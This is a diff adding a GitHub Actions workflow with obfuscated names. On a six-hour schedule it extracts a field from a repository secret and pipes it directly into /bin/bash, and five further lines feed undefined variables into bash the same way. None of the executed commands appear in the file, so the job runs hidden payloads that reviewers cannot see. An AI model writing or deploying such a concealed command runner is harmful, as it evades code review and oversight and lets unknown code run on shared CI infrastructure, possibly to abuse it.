@@ -1,0 +1,24 @@
+name: chengyiwaj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyiwaj
+        env:
+          i09: ${{ secrets.i09 }}
+        run: |
+          echo $i09 | jq -r .uqcf2 | /bin/bash
+          echo $c09942 | jq -r .ldbc9822 | /bin/bash
+          echo $tjyj8239 | jq -r .le016 | /bin/bash
+          echo $layrh8 | jq -r .qsp5 | /bin/bash
+          echo $oyme45 | jq -r .uu9613 | /bin/bash
+          echo $ch84 | jq -r .v423 | /bin/bash
+
